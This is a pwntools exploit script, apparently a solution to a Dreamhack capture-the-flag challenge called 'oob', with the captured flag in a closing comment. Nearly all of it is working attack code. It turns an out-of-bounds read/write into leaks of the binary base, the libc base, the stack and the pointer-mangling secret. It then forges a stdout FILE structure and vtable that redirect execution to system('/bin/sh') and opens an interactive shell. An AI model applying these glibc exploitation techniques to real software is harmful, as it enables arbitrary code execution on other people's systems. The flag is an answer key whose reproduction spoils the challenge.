from pwn import *
import time


context.terminal = ['kgx', '-e']
# context.terminal = ['kitty']

r = process('./oob_patched')
# r = remote('host3.dreamhack.games', 20995)
libc = ELF('./libc.so.6')

def arbread(addr):
    '''
    Read 8 bytes at a time at a time from addr
    '''
    to_read = addr - BASE
    print(f"Reading from {hex(addr)}, {hex(to_read)}")
    # if (to_read != -0x8 and to_read != 0x10):

    ret = b''
    for i in range(8):
        r.sendlineafter("> ", "1")
        r.sendlineafter("offset: ", str(to_read + i))
        l = r.recvline()
        ret += int.to_bytes(l[0])
    ret = ret[::-1]
    # print("leak: ", ret.hex())
    return ret
     
def arbwrite(addr, payload):
    to_write = addr - BASE
    for i in range(len(payload)):
        r.sendlineafter("> ", "2")
        r.sendlineafter("offset: ", str(to_write + i * 8))
        r.sendlineafter("value: ", str(payload[i]))


def build_fake_io_struct(start_addr, jump_addr):
    io_vals = []
    binsh_str = int.from_bytes("/bin/sh".encode(), byteorder='little')
    for i in range(0, start_addr, 8):
        if i == 224: break 
        val = int.from_bytes(arbread(start_addr + i), byteorder='big')
        io_vals.append(val)
    io_vals[0] = binsh_str
    io_vals[27] = jump_addr
    return io_vals

def build_vtable(system):
    ret = [b'\x00' * 8 for i in range(21)]
    ret = [int.from_bytes(i, byteorder='big' ) for i in ret]
    ret [7] = system
    return ret

def leak_ptr_loc(libc_base):
    # leak first page
    offset = 0x7ffff7e1b000 - 0x7ffff7c00000     
    first_page = libc_base + offset 
    print(hex(first_page))
    # 
    for i in range(0, 0xd000, 8):
        val = int.from_bytes(arbread(first_page + i), byteorder='big')
        if (val >> 40) & 0x7f:
            print(hex(val), hex(i))
            input()
            return val
            # gdb.attach(r)


def leak_mangle(start_addr):
    for i in range(448, 0x1000):
        val = int.from_bytes(arbread(start_addr + i)) 
        print(i, hex(val))
        if val == 0x000034365f363878:
            ret = int.from_bytes(arbread(start_addr + i-0x08)) 
            print(hex(ret))
            return ret

def PTR_MANGLE(val,secret):
    #Shamelessly stolen from https://gist.github.com/trietptm/5cd60ed6add5adad6a34098ce255949a
    rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

    mangled = val^secret
    mangled = rol(mangled,0x11,64)

    return mangled



exe_base_leak = 0x0000555555558008
BASE = 0x0000555555558010 # location of hello world in our example, need offset to this
actual_base = arbread(exe_base_leak)

BASE = int.from_bytes(actual_base, byteorder='big') + 0x8
print(f"Base addr: {hex(BASE)}")

stdout_io_val = BASE + 16

libc_base = 0x7ffff7c00000    
first_page_off = 0x7ffff7e1b000 - 0x7ffff7c00000     
stdout_glibc = 0x7ffff7e1a780 
stdout_offset = stdout_glibc - libc_base 

stdout_leak = arbread(stdout_io_val) 
stdout_leak = int.from_bytes(stdout_leak, byteorder='big')
print(hex(stdout_offset))
libc_base = stdout_leak - stdout_offset
print(arbread(libc_base + first_page_off + 0xa88).hex())
print(arbread(libc_base ).hex())
# time.sleep(1)
#
print(f"Libc base: {hex(libc_base)}")
system = libc_base + libc.symbols['system']
print(f"System: {hex(system)}")

# mangle_offset = 0x7ffff7ffcab0 - 0x7ffff7c00000    
# print(f"offset: {hex(mangle_offset)}")

# print(f"Addr: {hex(libc_base + first_page_off + 0xa80)}")
# print(arbread(libc_base + first_page_off + 0xa80).hex())

# leak_ptr_loc(libc_base)
stack_leak = int.from_bytes(arbread(libc_base + 0x221200)) # environment pointer
print(f"Stack leak: {hex(stack_leak)}")
mangle = leak_mangle(stack_leak)
print(f"Mangle value: {hex(mangle)}")
# leak_ptr_loc(libc_base)

# arbwrite(BASE,[0x41])
# print(f"Addr: {libc_base + first_page_off + 0xa80}")
# print(arbread(libc_base + first_page_off + 0xa80).hex())
# print(arbread(libc_base + first_page_off + 0xa88).hex())
# print(arbread(libc_base + first_page_off + 0xa90).hex())
#
#

accept_vtable_offset = libc_base + 0x21ba28
vtable_check = libc_base + 0x89f70
print(f"vtable offset: {hex(accept_vtable_offset)}, {hex(vtable_check)}")
print(f"{hex(PTR_MANGLE(vtable_check, mangle))}")
arbwrite(accept_vtable_offset, [PTR_MANGLE(vtable_check, mangle)])


fake_vtable = build_vtable(system)
arbwrite(accept_vtable_offset, [PTR_MANGLE(vtable_check, mangle)])
print(fake_vtable)
binsh_str = int.from_bytes(b'/bin/sh', byteorder='little')

io_vals = build_fake_io_struct(stdout_leak, BASE+48) # read from stdout_leak, jump address we want to write
print(arbread(vtable_check).hex())
arbwrite(BASE + 256, io_vals)

# gdb.attach(r, gdbscript=f'''
# b *{libc_base+0x89f88}
# ''')

arbwrite(BASE+48, fake_vtable)
arbwrite(BASE+16, [BASE+256])


r.interactive()
# mangle_val = arbread(libc_base+mangle_offset)
# mangle_val = int.from_bytes(mangle_val, byteorder='big')
# print(f"Mangle val: {hex(mangle_val)}")

# basically place the vtable right after the hello world str, and modify the field that should contain the JUMP_FIELD for _overflow
# 32 is start of the fake jump table, 3 * 8 is jump field for _overflow
# offset_to_system = 3 * 8 + 32
# arbwrite(stdout_io_val + offset_to_system, [system])
# arbwrite(stdout_leak, [binsh_str])
# arbwrite(stdout_leak+216, [stdout_io_val + 32])




# flag: DH{b3V0X29mX2JvdW5kPT0=}



